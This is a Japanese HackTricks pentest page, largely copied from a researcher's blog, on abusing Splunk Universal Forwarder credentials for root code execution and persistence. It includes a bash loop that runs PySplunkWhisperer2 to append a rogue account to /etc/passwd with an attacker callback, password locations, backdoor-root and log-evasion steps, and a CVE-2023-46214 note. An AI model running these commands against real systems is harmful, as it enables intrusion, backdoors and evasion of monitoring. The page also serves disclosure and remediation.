# Splunk LPEと永続性

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>

**内部的**または**外部的**にマシンを**列挙**していて、**Splunkが実行中**であること（ポート8090）がわかった場合、幸運にも**有効な資格情報**を知っていれば、Splunkサービスを**悪用してシェルを実行**することができます。rootが実行している場合、root権限に昇格することができます。

また、**すでにrootであり、Splunkサービスがlocalhostのみでリスニングしていない場合**は、Splunkサービス**から**パスワードファイルを**盗み**、パスワードを**クラック**するか、新しい資格情報を追加することができます。そして、ホスト上での永続性を維持します。

以下の最初の画像では、SplunkdのWebページの様子を見ることができます。

**以下の情報は** [**https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/**](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) **からコピーされました**

## シェルと永続性のためのSplunk Forwardersの悪用

2020年8月14日

### 説明: <a href="#description" id="description"></a>

Splunk Universal Forwarder Agent（UF）は、認証されたリモートユーザーがSplunk APIを通じてエージェントに単一のコマンドまたはスクリプトを送信することを可能にします。UFエージェントは、接続が有効なSplunk Enterpriseサーバーからのものであるかどうかを検証せず、UFエージェントはコードがSplunk Enterpriseサーバーから署名されているか、それ以外の方法で証明されているかどうかも検証しません。これにより、UFエージェントのパスワードにアクセスした攻撃者は、オペレーティングシステムに応じてSYSTEMまたはrootとしてサーバー上で任意のコードを実行することができます。

この攻撃はペネトレーションテスターによって使用されており、悪意のある攻撃者によって野生で積極的に悪用されている可能性があります。パスワードを取得することは、顧客環境の何百ものシステムの妥協につながる可能性があります。

Splunk UFのパスワードは比較的簡単に取得できます。詳細については、共通のパスワードの場所セクションを参照してください。

### 文脈: <a href="#context" id="context"></a>

Splunkは、セキュリティ情報およびイベント監視（SIEM）システムとしてよく使用されるデータ集約および検索ツールです。Splunk Enterprise Serverはサーバー上で実行されるWebアプリケーションであり、ネットワーク内のすべてのシステムにインストールされたエージェントであるUniversal Forwardersがあります。SplunkはWindows、Linux、Mac、Unix用のエージェントバイナリを提供しています。多くの組織は、Linux/Unixホストにエージェントをインストールする代わりにSyslogを使用してSplunkにデータを送信しますが、エージェントのインストールはますます人気が高まっています。

Universal Forwarderは、https://host:8089で各ホストでアクセスできます。/service/などの保護されたAPIコールにアクセスすると、基本認証ボックスが表示されます。ユーザー名は常にadminであり、パスワードのデフォルトはchangemeでしたが、2016年にSplunkは新しいインストールに8文字以上のパスワードを設定することを要求しました。私のデモで注目すべきは、複雑さは要求されていないことで、私のエージェントのパスワードは12345678です。リモート攻撃者はロックアウトなしでパスワードをブルートフォースすることができます。これはログホストの必要性です。アカウントがロックアウトされた場合、ログはもはやSplunkサーバーに送信されなくなり、攻撃者はこれを使用して攻撃を隠すことができます。次のスクリーンショットはUniversal Forwarderエージェントを示しており、この初期ページは認証なしでアクセス可能であり、Splunk Universal Forwarderを実行しているホストを列挙するために使用できます。

![0](https://eapolsniper.github.io/assets/2020AUG14/11\_SplunkAgent.png)

Splunkのドキュメントは、すべてのエージェントに同じUniversal Forwardingパスワードを使用することを示していますが、これが要件であるか、各エージェントに個別のパスワードを設定できるかどうかは確信が持てません。しかし、ドキュメントとSplunk管理者だったときの記憶に基づいて、すべてのエージェントは同じパスワードを使用する必要があると信じています。これは、パスワードが1つのシステムで見つかったりクラックされたりした場合、すべてのSplunk UFホストで機能する可能性が高いことを意味します。これは私の個人的な経験であり、迅速に何百ものホストを妥協することを可能にしました。

### 共通のパスワードの場所 <a href="#common-password-locations" id="common-password-locations"></a>

私はしばしば、ネットワーク上の以下の場所でSplunk Universal Forwardingエージェントのプレーンテキストパスワードを見つけます：

1. Active Directory Sysvol/domain.com/Scriptsディレクトリ。管理者は、効率的なエージェントのインストールのために、実行可能ファイルとパスワードを一緒に保存します。
2. ITインストールファイルをホストするネットワークファイル共有
3. 内部ネットワーク上のWikiまたはその他のビルドノートリポジトリ

パスワードは、WindowsホストのProgram Files\Splunk\etc\passwdおよびLinuxおよびUnixホストの/opt/Splunk/etc/passwdでハッシュ形式でもアクセスできます。攻撃者はHashcatを使用してパスワードをクラックしようとするか、ハッシュをクラックする可能性を高めるためにクラウドクラッキング環境を借りることができます。パスワードは強力なSHA-256ハッシュであり、そのため強力でランダムなパスワードはクラックされる可能性が低いです。

### 影響: <a href="#impact" id="impact"></a>

Splunk Universal Forward Agentのパスワードを持つ攻撃者は、ネットワーク内のすべてのSplunkホストを完全に妥協し、各ホストでSYSTEMまたはrootレベルの権限を取得することができます。私はWindows、Linux、Solaris UnixホストでSplunkエージェントを成功裏に使用しました。この脆弱性により、システムの資格情報がダンプされたり、機密データが抽出されたり、ランサムウェアがインストールされたりする可能性があります。この脆弱性は迅速で使いやすく、信頼性があります。

Splunkはログを処理するため、攻撃者は最初に実行されるコマンドでUniversal Forwarderを再構成して、Forwarderの場所を変更し、Splunk SIEMへのログ記録を無効にすることができます。これにより、クライアントのBlue Teamによって捕捉される可能性が大幅に低減されます。

Splunk Universal Forwarderは、ログ収集のためにドメインコントローラーにインストールされることがよくあります。これにより、攻撃者は簡単にNTDSファイルを抽出したり、さらなる悪用のためにアンチウイルスを無効にしたり、ドメインを変更したりすることができます。

最後に、Universal Forwarding Agentにはライセンスが必要なく、パスワードでスタンドアロンで構成できます。したがって、攻撃者はUniversal Forwarderをホスト上のバックドア永続性メカニズムとしてインストールできます。これは、Splunkを使用していない顧客であっても、正当なアプリケーションであり、おそらく削除されないでしょう。

### 証拠: <a href="#evidence" id="evidence"></a>

搾取の例を示すために、Enterprise ServerとUniversal Forwardingエージェントの両方に最新のSplunkバージョンを使用してテスト環境を設定しました。このレポートには合計10枚の画像が添付されており、以下を示しています：

1- PySplunkWhisper2を通じて/etc/passwdファイルを要求する

![1](https://eapolsniper.github.io/assets/2020AUG14/1\_RequestingPasswd.png)

2- Netcatを通じて攻撃者システムに/etc/passwdファイルを受信する

![2](https://eapolsniper.github.io/assets/2020AUG14/2\_ReceivingPasswd.png)

3- PySplunkWhisper2を通じて/etc/shadowファイルを要求する

![3](https://eapolsniper.github.io/assets/2020AUG14/3\_RequestingShadow.png)

4- Netcatを通じて攻撃者システムに/etc/shadowファイルを受信する

![4](https://eapolsniper.github.io/assets/2020AUG14/4\_ReceivingShadow.png)

5- /etc/passwdファイルにユーザーattacker007を追加する

![5](https://eapolsniper.github.io/assets/2020AUG14/5\_AddingUserToPasswd.png)

6- /etc/shadowファイルにユーザーattacker007を追加する

![6](https://eapolsniper.github.io/assets/2020AUG14/6\_AddingUserToShadow.png)

7- attacker007が正常に追加されたことを示す新しい/etc/shadowファイルを受信する

![7](https://eapolsniper.github.io/assets/2020AUG14/7\_ReceivingShadowFileAfterAdd.png)

8- attacker007アカウントを使用して被害者へのSSHアクセスを確認する

![8](https://eapolsniper.github.io/assets/2020AUG14/8\_SSHAccessUsingAttacker007.png)

9- ユーザー名root007のバックドアrootアカウントを追加し、uid/gidを0に設定する

![9](https://eapolsniper.github.io/assets/2020AUG14/9\_AddingBackdoorRootAccount.png)

10- attacker007を使用してSSHアクセスを確認し、その後root007を使用してrootに昇格する

![10](https://eapolsniper.github.io/assets/2020AUG14/10\_EscalatingToRoot.png)

この時点で、Splunkと作成した2つのユーザーアカウントの両方を通じてホストへの永続的なアクセスを持っています。そのうちの1つはrootを提供します。私は自分の足跡を隠すためにリモートログを無効にし、このホストを使用してシステムとネットワークを攻撃し続けることができます。

PySplunkWhisperer2のスクリプトは非常に簡単で効果的です。

1. 搾取したいホストのIPを含むファイルを作成します。例えばip.txtという名前です。
2. 次のように実行します：
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
ホスト情報:

Splunk Enterprise Server: 192.168.42.114\
Splunk Forwarder Agent Victim: 192.168.42.98\
攻撃者:192.168.42.51

Splunk Enterprise バージョン: 8.0.5 (2020年8月12日のラボ設定時点での最新版)\
Universal Forwarder バージョン: 8.0.5 (2020年8月12日のラボ設定時点での最新版)

#### Splunk, Incに対する修正推奨事項: <a href="#remediation-recommendations-for-splunk-inc" id="remediation-recommendations-for-splunk-inc"></a>

以下のすべての解決策を実装し、深層防御を提供することを推奨します:

1. 理想的には、Universal Forwarder エージェントはポートを開放せず、定期的にSplunkサーバーに指示を求めるべきです。
2. クライアントとサーバー間でTLS相互認証を有効にし、各クライアントに個別の鍵を使用します。これにより、すべてのSplunkサービス間で非常に高い双方向セキュリティが提供されます。TLS相互認証はエージェントやIoTデバイスで広く実装されており、信頼できるデバイスクライアントからサーバーへの通信の未来です。
3. すべてのコード、単一行、またはスクリプトファイルを、Splunkサーバーによって暗号化および署名された圧縮ファイルで送信します。これはAPIを通じて送信されるエージェントデータを保護するものではありませんが、第三者による悪意のあるリモートコード実行から保護します。

#### Splunkの顧客に対する修正推奨事項: <a href="#remediation-recommendations-for-splunk-customers" id="remediation-recommendations-for-splunk-customers"></a>

1. Splunkエージェントに非常に強力なパスワードを設定してください。私は少なくとも15文字のランダムパスワードを推奨しますが、これらのパスワードは決して入力されないため、50文字など非常に長いパスワードに設定することができます。
2. ホストベースのファイアウォールを設定し、Splunkサーバーからの8089/TCPポート（Universal Forwarder Agentのポート）への接続のみを許可します。

### Red Teamに対する推奨事項: <a href="#recommendations-for-red-team" id="recommendations-for-red-team"></a>

1. 各オペレーティングシステム用のSplunk Universal Forwarderのコピーをダウンロードしてください。これは優れた軽量で署名されたインプラントです。Splunkが実際にこの問題を修正する場合に備えて、コピーを保持しておくと良いでしょう。

### 他の研究者からのエクスプロイト/ブログ <a href="#exploitsblogs-from-other-researchers" id="exploitsblogs-from-other-researchers"></a>

利用可能な公開エクスプロイト:

* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487

関連するブログ投稿:

* https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/
* https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2
* https://www.hurricanelabs.com/splunk-tutorials/using-splunk-as-an-offensive-security-tool

_\*\* 注意: \*\*_ この問題はSplunkシステムにとって深刻な問題であり、他のテスターによって何年にもわたって悪用されてきました。Splunk Universal Forwarderのリモートコード実行は意図された機能ですが、その実装は危険です。私はこのバグをSplunkのバグ報奨プログラムに提出しようとしましたが、非常にまれなケースで彼らが設計の意図を認識していない可能性があるためですが、バグ報告はBug Crowd/Splunkの開示ポリシーに従う必要があり、Splunkの許可なしには脆弱性の詳細を_publically_に議論することは決して許されないと通知されました。私は90日間の開示タイムラインを要求しましたが、拒否されました。そのため、私はこの問題を責任を持って開示しませんでした。なぜなら、Splunkは問題を認識しており、無視を選択していると合理的に確信しており、これは企業に深刻な影響を与える可能性があり、情報セキュリティコミュニティには企業を教育する責任があると感じているからです。

## Splunkクエリの悪用

情報元 [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)

**CVE-2023-46214** は任意のスクリプトを **`$SPLUNK_HOME/bin/scripts`** にアップロードすることを許可し、その後、検索クエリ **`|runshellscript script_name.sh`** を使用してそこに保存された **スクリプト** を **実行** する方法を説明しました:

<figure><img src="../../.gitbook/assets/image (721).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>こちら</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksに広告を掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、私たちの独占的な[**NFTコレクション**](https://opensea.io/collection/the-peass-family)をチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>
